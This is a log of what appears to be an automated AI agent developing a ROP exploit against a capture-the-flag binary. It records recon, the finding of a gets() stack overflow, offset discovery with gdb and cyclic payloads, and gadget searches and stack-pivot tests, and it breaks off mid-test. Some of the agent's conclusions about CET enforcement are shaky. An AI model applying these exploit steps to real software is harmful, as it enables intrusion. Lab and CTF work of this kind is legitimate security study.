14:06:53 === Full Run: S1 → S2 → S3（所有 bug） → S4 ===

14:06:53 --- S1 Recon ---
14:06:53 === recon (bug_id=-) ===
14:06:53 [recon] → 调用 GLM...
14:06:57 [recon] ← GLM(4.2s): 调工具[checksec, elf_info, identify_libc, sections, list_strings]
14:06:57 [recon] 我将开始对目标二进制进行系统性侦察。先并行收集基础信息。
14:06:57 [recon]   → 工具 checksec({"binary": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target"})
14:06:57 [recon]   → 工具 elf_info({"binary": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target"})
14:06:57 [recon]   → 工具 identify_libc({"binary": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target"})
14:06:57 [recon]   → 工具 sections({"binary": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target"})
14:06:57 [recon]   → 工具 list_strings({"binary": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target", "max_lines": 200})
14:06:57 [recon]   ← sections(0.0s): There are 31 section headers, starting at offset 0x3a88: ⏎  ⏎ Section Headers: ⏎   [Nr] Name              Type             Address           Offset ⏎ ...(4807 chars)
14:06:57 [recon]   ← list_strings(0.0s): /lib64/ld-linux-x86-64.so.2 ⏎ +Fgb ⏎ libc.so.6 ⏎ gets ⏎ stdin ⏎ stdout ⏎ stderr ⏎ alarm ⏎ close ⏎ setvbuf ⏎ __libc_start_main ⏎ GLIBC_2.2.5 ⏎ __gmon_s...(1224 chars)
14:06:57 [recon]   ← elf_info(0.0s): /work/workspace/0025-2023-52-rop-revenge-20260909-140653/target: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ...(4180 chars)
14:06:57 [recon]   ← identify_libc(0.0s): 	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007a08dbe03000) ⏎ ===LIBC VERSION=== ⏎ GNU C Library (Ubuntu GLIBC 2.39-0ubuntu8.8) stable release ...(166 chars)
14:06:58 [recon]   ← checksec(0.1s): [*] '/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target' ⏎     Arch:       amd64-64-little ⏎     RELRO:      Partial RELRO ⏎     Stack:  ...(310 chars)
14:06:58 [recon] → 调用 GLM...
14:07:02 [recon] ← GLM(4.5s): 调工具[symbols, global_vars, got_plt, disassemble, cfg]
14:07:02 [recon] 关键发现：二进制使用 `gets`（危险函数），无 PIE，无 Canary，Partial RELRO。源文件名 `chall.c`，有 `vuln` 函数。继续收集符号、GOT/PLT、全局变量、反汇编和 CFG。
14:07:02 [recon]   → 工具 symbols({"binary": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target", "max_lines": 100})
14:07:02 [recon]   → 工具 global_vars({"binary": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target", "max_lines": 60})
14:07:02 [recon]   → 工具 got_plt({"binary": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target"})
14:07:02 [recon]   → 工具 disassemble({"binary": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target", "lines": 200})
14:07:02 [recon]   → 工具 cfg({"binary": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target"})
14:07:02 [recon]   ← global_vars(0.0s):      7: 0000000000404060     8 OBJECT  GLOBAL DEFAULT   26 stdout@GLIBC_2.2.5 (2) ⏎      8: 0000000000404070     8 OBJECT  GLOBAL DEFAULT   26 stdin@G...(1212 chars)
14:07:02 [recon]   ← got_plt(0.0s): [{"offset": "0000000000403ff0", "type": "R_X86_64_GLOB_DAT", "value": "__libc_start_main@GLIBC_2.2.5"}, {"offset": "0000000000403ff8", "type": "R_X86_...(823 chars)
14:07:02 [recon]   ← symbols(0.0s): 0000000000403e20 d _DYNAMIC ⏎ 0000000000404000 d _GLOBAL_OFFSET_TABLE_ ⏎ 0000000000402000 R _IO_stdin_used ⏎ 0000000000402194 r __FRAME_END__ ⏎ 000000...(1438 chars)
14:07:02 [recon]   ← disassemble(0.0s):  ⏎ /work/workspace/0025-2023-52-rop-revenge-20260909-140653/target:     file format elf64-x86-64 ⏎  ⏎  ⏎ Disassembly of section .init: ⏎  ⏎ 0000000000...(6018 chars)
14:07:03 [recon]   ← cfg(0.6s): [{"name": "_init", "addr": "0x401000", "blocks": 3, "calls": ["UnresolvableCallTarget"]}, {"name": "sub_401020", "addr": "0x401020", "blocks": 1, "cal...(3573 chars)
14:07:03 [recon] → 调用 GLM...
14:07:09 [recon] ← GLM(6.3s): 调工具[probe_io, libc_offsets, execute]
14:07:09 [recon] 核心逻辑已清晰。`vuln` 函数在栈上分配 0x70 字节缓冲区后调用 `gets`（无边界检查），随后关闭 fd 1 和 2。现在做运行时探测确认 I/O 行为，并查 libc 关键符号偏移。
14:07:09 [recon]   → 工具 probe_io({"binary": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target", "input": "AAAA", "max_lines": 40})
14:07:09 [recon]   → 工具 libc_offsets({"libc_path": "/lib/x86_64-linux-gnu/libc.so.6", "symbols": "system,execve,gets,puts,printf,gets,open,read,write,close,alarm,setvbuf,environ,__libc_st)
14:07:09 [recon]   → 工具 execute({"command": "readelf -d /work/workspace/0025-2023-52-rop-revenge-20260909-140653/target | grep -iE 'path|needed|rpath|runpath'"})
14:07:09 [recon]   ← probe_io(0.0s): <no output>
14:07:09 [recon]   ← execute(0.0s):  0x0000000000000001 (NEEDED)             Shared library: [libc.so.6] ⏎  ⏎ [Command succeeded with exit code 0]
14:07:09 [recon]   ← libc_offsets(0.1s): {"system": "0x58750", "execve": "0xef030", "gets": "0x87160", "puts": "0x87cc0", "printf": "0x60100", "open": "0x11b250", "read": "0x11bb80", "write":...(280 chars)
14:07:09 [recon] → 调用 GLM...
14:07:14 [recon] ← GLM(4.6s): 调工具[list_strings, execute]
14:07:14 [recon] 探测无输出（符合预期：`vuln` 调用 `gets` 读入后立即 `close(1)` 和 `close(2)`，stdout/stderr 被关闭所以无回显）。无 RPATH/RUNPATH，仅依赖 libc.so.6。现在查 libc 中的 `/bin/sh` 字符串偏移，并确认 ldd 完整
14:07:14 [recon]   → 工具 list_strings({"binary": "/lib/x86_64-linux-gnu/libc.so.6", "filter": "/bin/sh", "max_lines": 10})
14:07:14 [recon]   → 工具 execute({"command": "ldd /work/workspace/0025-2023-52-rop-revenge-20260909-140653/target"})
14:07:14 [recon]   ← execute(0.0s): 	linux-vdso.so.1 (0x00007e3def1f5000) ⏎ 	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007e3deefd5000) ⏎ 	/lib64/ld-linux-x86-64.so.2 (0x00007e3de...(200 chars)
14:07:14 [recon]   ← list_strings(0.0s): /bin/sh ⏎ 
14:07:14 [recon] → 调用 GLM...
14:07:17 [recon] ← GLM(3.8s): 调工具[execute]
14:07:17 [recon] 需要确认 `/bin/sh` 字符串在 libc 中的精确偏移。用 nm 或 strings 配合 grep 获取地址。
14:07:17 [recon]   → 工具 execute({"command": "strings -t x /lib/x86_64-linux-gnu/libc.so.6 | grep -m1 '/bin/sh'"})
14:07:18 [recon]   ← execute(0.0s):  1cb42f /bin/sh ⏎  ⏎ [Command succeeded with exit code 0]
14:07:18 [recon] → 调用 GLM...
14:09:02 [recon] ← GLM(104.7s): 调工具[submit_final_result]
14:09:02 [recon] 所有事实已收集完毕。现在整理并提交结构化侦察报告。  关键事实总结： - **二进制**：amd64 ELF EXEC，No PIE (0x400000)，not stripped，源文件 `chall.c` - **保护**：Partial RELRO，NX enabled，No Canary，S
14:09:02 [recon] ✓ submit_final_result 收到最终报告（ReconReport 校验通过，16655 chars）
14:09:02 [recon] → 调用 GLM...
14:09:13 [recon] ← GLM(10.3s)
14:09:13 [recon] S1 侦察已完成并提交。核心发现摘要：  **二进制**：amd64 ELF，No PIE (0x400000)，not stripped，源文件 `chall.c`，GCC 9.4.0 编译。  **保护机制**：Partial RELRO、NX enabled、**No Canary**、No 
14:09:13 [stage1] 保存 → /work/workspace/0025-2023-52-rop-revenge-20260909-140653/stage1.json
14:09:13 --- S2 Semantic ---
14:09:13 === semantic (bug_id=-) ===
14:09:13 [semantic] → 调用 GLM...
14:09:17 [semantic] ← GLM(4.3s): 调工具[disassemble, disassemble, disassemble]
14:09:17 [semantic] 我将分析该二进制文件的语义级漏洞。S1 侦察结果已经提供了详尽的事实。让我通过检查实际的反汇编代码来验证关键细节，以确保我的分析基于已验证的事实。
14:09:17 [semantic]   → 工具 disassemble({"binary": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target", "function": "vuln"})
14:09:17 [semantic]   → 工具 disassemble({"binary": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target", "function": "main"})
14:09:17 [semantic]   → 工具 disassemble({"binary": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target", "function": "init"})
14:09:17 [semantic]   ← disassemble(0.0s): 0000000000401205 <vuln>: ⏎   401205:	endbr64 ⏎   401209:	push   rbp ⏎   40120a:	mov    rbp,rsp ⏎   40120d:	sub    rsp,0x70 ⏎   401211:	lea    rax,[rbp...(433 chars)
14:09:17 [semantic]   ← disassemble(0.0s): 0000000000401239 <main>: ⏎   401239:	endbr64 ⏎   40123d:	push   rbp ⏎   40123e:	mov    rbp,rsp ⏎   401241:	mov    eax,0x0 ⏎   401246:	call   401196 <i...(325 chars)
14:09:17 [semantic]   ← disassemble(0.0s): 0000000000401196 <init>: ⏎   401196:	endbr64 ⏎   40119a:	push   rbp ⏎   40119b:	mov    rbp,rsp ⏎   40119e:	mov    rax,QWORD PTR [rip+0x2ecb]        # ...(913 chars)
14:09:17 [semantic] → 调用 GLM...
14:09:19 [semantic] ← GLM(2.5s): 调工具[checksec, got_plt]
14:09:19 [semantic] 反汇编结果确认了 S1 的分析结果。现在让我验证一下安全缓解措施，并检查 GOT/PLT 的细节，以确认外部库调用的边界。
14:09:19 [semantic]   → 工具 checksec({"binary": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target"})
14:09:19 [semantic]   → 工具 got_plt({"binary": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target"})
14:09:19 [semantic]   ← got_plt(0.0s): [{"offset": "0000000000403ff0", "type": "R_X86_64_GLOB_DAT", "value": "__libc_start_main@GLIBC_2.2.5"}, {"offset": "0000000000403ff8", "type": "R_X86_...(823 chars)
14:09:20 [semantic]   ← checksec(0.1s): [*] '/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target' ⏎     Arch:       amd64-64-little ⏎     RELRO:      Partial RELRO ⏎     Stack:  ...(310 chars)
14:09:20 [semantic] → 调用 GLM...
14:10:15 [semantic] ← GLM(55.3s): 调工具[submit_final_result]
14:10:15 [semantic] 所有事实已确认。现在我已经掌握了进行语义漏洞分析所需的一切。让我来综合一下这些发现。  **分析总结：**  该二进制文件非常简单——`main` 调用 `init()` 然后调用 `vuln()`。核心漏洞位于 `vuln` 函数中：  1. **`vuln` 在 0x401205**：分配了一个
14:10:15 [semantic] ✓ submit_final_result 收到最终报告（VulnerabilityReport 校验通过，11359 chars）
14:10:15 [semantic] → 调用 GLM...
14:10:24 [semantic] ← GLM(9.4s)
14:10:24 [semantic] S2 语义漏洞分析已完成并提交。以下是分析总结：  ## 分析结果  **发现 1 个高危漏洞：**  ### BUG-001: 通过 `gets()` 导致的栈缓冲区溢出  **根本原因：** `vuln()` 函数在 0x401205 处分配了一个 0x70 (112) 字节的栈缓冲区，并在 0
14:10:24 [stage2] 保存 → /work/workspace/0025-2023-52-rop-revenge-20260909-140653/stage2.json
14:10:24 --- S3 Primitive（所有 bug） ---
14:10:24 === impact (bug_id=BUG-001) ===
14:10:24 [impact:BUG-001] → 调用 GLM...
14:10:29 [impact:BUG-001] ← GLM(4.7s): 调工具[disassemble, disassemble, checksec]
14:10:29 [impact:BUG-001] 我将分析 BUG-001（通过 `gets()` 导致的栈缓冲区溢出）并推导/验证其原语。让我先从检查二进制文件并收集关键信息开始。
14:10:29 [impact:BUG-001]   → 工具 disassemble({"binary": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target", "function": "vuln"})
14:10:29 [impact:BUG-001]   → 工具 disassemble({"binary": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target", "function": "main"})
14:10:29 [impact:BUG-001]   → 工具 checksec({"binary": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target"})
14:10:29 [impact:BUG-001]   ← disassemble(0.0s): 0000000000401205 <vuln>: ⏎   401205:	endbr64 ⏎   401209:	push   rbp ⏎   40120a:	mov    rbp,rsp ⏎   40120d:	sub    rsp,0x70 ⏎   401211:	lea    rax,[rbp...(433 chars)
14:10:29 [impact:BUG-001]   ← disassemble(0.0s): 0000000000401239 <main>: ⏎   401239:	endbr64 ⏎   40123d:	push   rbp ⏎   40123e:	mov    rbp,rsp ⏎   401241:	mov    eax,0x0 ⏎   401246:	call   401196 <i...(325 chars)
14:10:29 [impact:BUG-001]   ← checksec(0.1s): [*] '/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target' ⏎     Arch:       amd64-64-little ⏎     RELRO:      Partial RELRO ⏎     Stack:  ...(310 chars)
14:10:29 [impact:BUG-001] → 调用 GLM...
14:10:34 [impact:BUG-001] ← GLM(5.3s): 调工具[find_offset]
14:10:34 [impact:BUG-001] 很好。现在让我验证一下确切的溢出偏移量，并测试 CET 运行时强制执行状态，这对于 RIP_CONTROL 原语至关重要。
14:10:34 [impact:BUG-001]   → 工具 find_offset({"binary": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target", "length": 200})
14:10:34 [impact:BUG-001]   ← find_offset(0.0s): PC=UNKNOWN  ARCH=i386
14:10:34 [impact:BUG-001] → 调用 GLM...
14:10:39 [impact:BUG-001] ← GLM(4.5s): 调工具[gdb_run_crash]
14:10:39 [impact:BUG-001] 偏移量工具报告了架构问题。让我直接使用 `gdb` 来查找确切的偏移量并验证溢出。
14:10:39 [impact:BUG-001]   → 工具 gdb_run_crash({"binary": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target", "payload_file": "/work/workspace/0025-2023-52-rop-revenge-20260909-14065)
14:10:39 [impact:BUG-001]   ← gdb_run_crash(0.0s): {"raw_tail": "\n/bin/sh: 1: cannot open /work/workspace/0025-2023-52-rop-revenge-20260909-140653/crash_test.bin: No such file\nDuring startup program ...(234 chars)
14:10:39 [impact:BUG-001] → 调用 GLM...
14:10:47 [impact:BUG-001] ← GLM(8.2s): 调工具[make_payload]
14:10:47 [impact:BUG-001] 我需要先创建 payload 文件。让我创建一个用于测试偏移量的 cyclic pattern。
14:10:47 [impact:BUG-001]   → 工具 make_payload({"file_path": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/crash_test.bin", "parts": [["Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5A)
14:10:47 [impact:BUG-001]   ← make_payload(0.0s): /work/workspace/0025-2023-52-rop-revenge-20260909-140653/crash_test.bin len=270 preview_hex=4161304161314161324161334161344161354161364161374161384161...(156 chars)
14:10:47 [impact:BUG-001] → 调用 GLM...
14:10:51 [impact:BUG-001] ← GLM(3.6s): 调工具[gdb_run_crash]
14:10:51 [impact:BUG-001]   → 工具 gdb_run_crash({"binary": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target", "payload_file": "/work/workspace/0025-2023-52-rop-revenge-20260909-14065)
14:10:51 [impact:BUG-001]   ← gdb_run_crash(0.1s): {"signal": "SIGSEGV", "crash_addr": "0x0000000000401238", "crash_loc": "Segmentation fault.", "raw_tail": "6 in ?? ()\n#12 0x3168413068413967 in ?? ()...(420 chars)
14:10:51 [impact:BUG-001] → 调用 GLM...
14:10:55 [impact:BUG-001] ← GLM(4.4s): 调工具[gdb_run]
14:10:55 [impact:BUG-001] 崩溃发生在 0x401238（`ret` 指令处）。我可以看到崩溃地址是 0x0000000000401238，这意味着 `ret` 指令本身导致了段错误（segfault）。让我仔细检查一下寄存器，以找到确切的偏移量。
14:10:55 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target", "commands": "run < /work/workspace/0025-2023-52-rop-revenge-20260909-140)
14:10:55 [impact:BUG-001]   ← gdb_run(0.1s): [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎  ⏎ Program received signa...(494 chars)
14:10:55 [impact:BUG-001] → 调用 GLM...
14:11:06 [impact:BUG-001] ← GLM(10.2s): 调工具[execute]
14:11:06 [impact:BUG-001] 崩溃发生在 `ret` 指令 (0x401238) 处，RSP 指向 0x7fffffffeaa8，其中包含 0x6541316541306541。让我解码这个 cyclic pattern 以找到确切的偏移量。该 pattern 是 "Aa0Aa1Aa2Aa3..."，我需要找到哪个偏移量会产生 
14:11:06 [impact:BUG-001]   → 工具 execute({"command": "python3 -c \"\npattern = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6)
14:11:06 [impact:BUG-001]   ← execute(0.0s): Offset to return address: 120 ⏎ Pattern at offset: Ae0Ae1Ae ⏎ Offset to saved RBP: 112 ⏎ Pattern at RBP offset: d7Ad8Ad9 ⏎  ⏎ [Command succeeded with ...(162 chars)
14:11:06 [impact:BUG-001] → 调用 GLM...
14:11:10 [impact:BUG-001] ← GLM(4.1s)
14:11:10 [impact:BUG-001] 偏移量已确认：返回地址的偏移量为 120 (0x78)，保存的 RBP 的偏移量为 112 (0x70)。这与 S2 的分析完全吻合。现在让我验证一下 RIP_CONTROL 原语——我将用 120 字节的填充数据加上一个特定的目标地址来覆盖返回地址，并检查 RIP 是否等于该值。这同时也测试了 C
14:11:10 [retry] 无 submit（1/5），原地重试...
14:11:10 [impact:BUG-001] → 调用 GLM...
14:11:13 [impact:BUG-001] ← GLM(3.8s): 调工具[make_payload]
14:11:13 [impact:BUG-001] 我来创建一个带有特定目标地址的 payload，以验证 RIP_CONTROL。
14:11:13 [impact:BUG-001]   → 工具 make_payload({"file_path": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/rip_test.bin", "parts": [["A", 120], ["\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x4)
14:11:14 [impact:BUG-001]   ← make_payload(0.0s): /work/workspace/0025-2023-52-rop-revenge-20260909-140653/rip_test.bin len=128 preview_hex=414141414141414141414141414141414141414141414141414141414141...(154 chars)
14:11:14 [impact:BUG-001] → 调用 GLM...
14:11:16 [impact:BUG-001] ← GLM(2.9s): 调工具[gdb_run]
14:11:16 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target", "commands": "run < /work/workspace/0025-2023-52-rop-revenge-20260909-140)
14:11:16 [impact:BUG-001]   ← gdb_run(0.1s): [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎  ⏎ Program received signa...(382 chars)
14:11:16 [impact:BUG-001] → 调用 GLM...
14:11:21 [impact:BUG-001] ← GLM(5.0s): 调工具[gdb_run]
14:11:21 [impact:BUG-001] 有趣的是，崩溃发生在 `ret` 指令本身 (0x401238)，而不是在 0x4242424242424242 处。RBP 已被正确覆盖为 0x4141414141414141，但 RIP 仍然在 0x401238。这强烈暗示 CET Shadow Stack (SHSTK) 正在运行时被强制执行
14:11:21 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target", "commands": "run < /work/workspace/0025-2023-52-rop-revenge-20260909-140)
14:11:22 [impact:BUG-001]   ← gdb_run(0.1s): [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎  ⏎ Program received signa...(3029 chars)
14:11:22 [impact:BUG-001] → 调用 GLM...
14:11:27 [impact:BUG-001] ← GLM(5.1s): 调工具[execute]
14:11:27 [impact:BUG-001] 关键发现：RSP 处包含 0x4242424242424242（我们写入的返回地址），但 RIP 仍然停留在 0x401238（`ret` 指令）。`ret` 指令没有将 RIP 设置为 0x4242424242424242，而是触发了 SIGSEGV。这是 CET Shadow Stack (SH
14:11:27 [impact:BUG-001]   → 工具 execute({"command": "cat /proc/cpuinfo | grep -i cet | head -5; echo \"---\"; cat /proc/cpuinfo | grep -i shstk | head -5; echo \"---\"; cat /proc/cpuinfo | g)
14:11:27 [impact:BUG-001]   ← execute(0.0s): --- ⏎ --- ⏎ ibt ⏎  ⏎ [Command succeeded with exit code 0]
14:11:27 [impact:BUG-001] → 调用 GLM...
14:11:32 [impact:BUG-001] ← GLM(5.2s): 调工具[gdb_run]
14:11:32 [impact:BUG-001] CPU 支持 IBT，但不支持 SHSTK。因此，虽然 CPU 不支持 SHSTK，但 `ret` 指令在 0x401238 处发生了故障，而不是跳转到 0x4242424242424242。让我更仔细地调查一下为什么 `ret` 会在指令本身处发生故障，而不是在目标地址处。让我检查一下具体的信号：
14:11:32 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target", "commands": "set pagination off; run < /work/workspace/0025-2023-52-rop-)
14:11:32 [impact:BUG-001]   ← gdb_run(0.1s): [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎  ⏎ Program received signa...(963 chars)
14:11:32 [impact:BUG-001] → 调用 GLM...
14:11:40 [impact:BUG-001] ← GLM(8.5s): 调工具[execute]
14:11:40 [impact:BUG-001] 关键细节：`si_code = 128` (SEGV_CPERR = control protection error)。这是 CET 控制流强制执行信号。`si_code` 为 128 表示发生了控制保护违规。尽管 CPU 不支持 SHSTK，但内核/glibc 正在通过某种机制强制执行它。`re
14:11:40 [impact:BUG-001]   → 工具 execute({"command": "python3 -c \"\n# si_code 128 = SEGV_CPERR (Control Protection Error)\n# This is the CET violation signal\n# On Linux, si_code = 128 (SEGV)
14:11:40 [impact:BUG-001]   ← execute(0.0s): si_code 128 = SEGV_CPERR = Control Protection Error ⏎ This confirms CET is enforced at runtime ⏎ The ret instruction detected return address mismatch ...(469 chars)
14:11:40 [impact:BUG-001] → 调用 GLM...
14:11:46 [impact:BUG-001] ← GLM(5.5s): 调工具[make_payload]
14:11:46 [impact:BUG-001] 现在让我验证一下 STACK_CONTROL 原语——即堆栈内存损坏确实发生了。我将使用一个 payload 来覆盖 RBP，但保持返回地址完整，以查看 `leave` 指令是否损坏了堆栈帧。让我再验证一下 RELATIVE_WRITE 原语（堆栈写入本身）。
14:11:46 [impact:BUG-001]   → 工具 make_payload({"file_path": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/stack_test.bin", "parts": [["B", 112], ["\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\)
14:11:46 [impact:BUG-001]   ← make_payload(0.0s): /work/workspace/0025-2023-52-rop-revenge-20260909-140653/stack_test.bin len=128 preview_hex=4242424242424242424242424242424242424242424242424242424242...(156 chars)
14:11:46 [impact:BUG-001] → 调用 GLM...
14:11:50 [impact:BUG-001] ← GLM(4.2s): 调工具[gdb_run]
14:11:50 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target", "commands": "b *0x401237; run < /work/workspace/0025-2023-52-rop-revenge)
14:11:50 [impact:BUG-001]   ← gdb_run(0.1s): Breakpoint 1 at 0x401237 ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ...(953 chars)
14:11:50 [impact:BUG-001] → 调用 GLM...
14:11:59 [impact:BUG-001] ← GLM(9.0s): 调工具[make_payload]
14:11:59 [impact:BUG-001] 太棒了！这证实了以下几点：  1. **STACK_CONTROL (VERIFIED)**：在 `leave` 指令之前，RBP=0x7fffffffeaa0，且栈上保存的 RBP (0x4141414141414141) 和返回地址 (0x4242424242424242) 均被攻击者数据覆盖。
14:11:59 [impact:BUG-001]   → 工具 make_payload({"file_path": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/relwrite_test.bin", "parts": [["\\x00", 112], ["\\xde\\xad\\xbe\\xef\\xde\\xad)
14:11:59 [impact:BUG-001]   ← make_payload(0.0s): /work/workspace/0025-2023-52-rop-revenge-20260909-140653/relwrite_test.bin len=128 preview_hex=0000000000000000000000000000000000000000000000000000000...(159 chars)
14:11:59 [impact:BUG-001] → 调用 GLM...
14:12:03 [impact:BUG-001] ← GLM(4.0s): 调工具[gdb_run]
14:12:03 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target", "commands": "b *0x401237; run < /work/workspace/0025-2023-52-rop-revenge)
14:12:03 [impact:BUG-001]   ← gdb_run(0.1s): Breakpoint 1 at 0x401237 ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ...(407 chars)
14:12:03 [impact:BUG-001] → 调用 GLM...
14:12:12 [impact:BUG-001] ← GLM(8.2s): 调工具[search_rop_gadgets, search_rop_gadgets]
14:12:12 [impact:BUG-001] RELATIVE_WRITE 已确认：偏移量 0x70 处的 saved RBP 被覆盖为 0xefbeaddeefbeadde (deadbeefdeadbeef)，偏移量 0x78 处的返回地址被覆盖为 0xbebafecabebafeca (cafebabecafebabe)。攻击者可以写入超
14:12:12 [impact:BUG-001]   → 工具 search_rop_gadgets({"binary": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target", "keyword": "leave", "max_results": 10})
14:12:12 [impact:BUG-001]   → 工具 search_rop_gadgets({"binary": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target", "keyword": "pop rdi", "max_results": 10})
14:12:12 [impact:BUG-001]   ← search_rop_gadgets(0.1s): 0x00000000004012c3 : pop rdi ; ret
14:12:12 [impact:BUG-001]   ← search_rop_gadgets(0.1s): 0x0000000000401237 : leave ; ret ⏎ 0x0000000000401236 : nop ; leave ; ret
14:12:12 [impact:BUG-001] → 调用 GLM...
14:12:15 [impact:BUG-001] ← GLM(3.8s): 调工具[make_payload]
14:12:15 [impact:BUG-001] 现在让我测试一下 stack pivot 是否可行。`leave` 指令执行 `mov rsp, rbp; pop rbp`。如果我们控制了 RBP，我们就可以控制 RSP。但是 `leave` 之后的 `ret` 仍然会触发 CET。让我测试一下 stack pivot 是否能绕过 CET，或者 
14:12:15 [impact:BUG-001]   → 工具 make_payload({"file_path": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/pivot_test.bin", "parts": [["A", 112], ["\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\)
14:12:15 [impact:BUG-001]   ← make_payload(0.0s): /work/workspace/0025-2023-52-rop-revenge-20260909-140653/pivot_test.bin len=128 preview_hex=4141414141414141414141414141414141414141414141414141414141...(156 chars)
14:12:15 [impact:BUG-001] → 调用 GLM...
14:12:18 [impact:BUG-001] ← GLM(2.6s): 调工具[gdb_run]
14:12:18 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target", "commands": "run < /work/workspace/0025-2023-52-rop-revenge-20260909-140)
14:12:18 [impact:BUG-001]   ← gdb_run(0.1s): [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎  ⏎ Program received signa...(376 chars)
14:12:18 [impact:BUG-001] → 调用 GLM...
14:12:25 [impact:BUG-001] ← GLM(7.1s): 调工具[make_payload]
14:12:25 [impact:BUG-001] 有趣！这次崩溃发生在 0x401237（`leave` 指令处），si_code=1 (SEGV_MAPERR)。`leave` 指令执行了 `mov rsp, rbp`（将 RSP 设置为 0x0，即我们覆盖的 RBP 值），然后 `pop rbp` 尝试从地址 0x0 读取，这导致了段错误（se
14:12:25 [impact:BUG-001]   → 工具 make_payload({"file_path": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/pivot_test2.bin", "parts": [["A", 112], ["\\x00\\xea\\xff\\xff\\xff\\x7f\\x00\)
14:12:25 [impact:BUG-001]   ← make_payload(0.0s): /work/workspace/0025-2023-52-rop-revenge-20260909-140653/pivot_test2.bin len=128 preview_hex=414141414141414141414141414141414141414141414141414141414...(157 chars)
14:12:25 [impact:BUG-001] → 调用 GLM...
14:12:31 [impact:BUG-001] ← GLM(5.6s): 调工具[gdb_run]
14:12:31 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target", "commands": "b *0x401237; run < /work/workspace/0025-2023-52-rop-revenge)
14:12:31 [impact:BUG-001]   ← gdb_run(0.1s): Breakpoint 1 at 0x401237 ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ...(536 chars)
14:12:31 [impact:BUG-001] → 调用 GLM...
14:12:39 [impact:BUG-001] ← GLM(7.7s): 调工具[gdb_run]
14:12:39 [impact:BUG-001] 稍等 - 这次 `ret` 跳转到了 0x401237 (leave; ret)，且 si_code=2 (SEGV_ACCERR)。让我重新检查一下 - 返回地址是 0x401237，也就是 `leave; ret` gadget。`ret` 执行后跳转到了 0x401237，然后 `leave`
14:12:39 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target", "commands": "run < /work/workspace/0025-2023-52-rop-revenge-20260909-140)
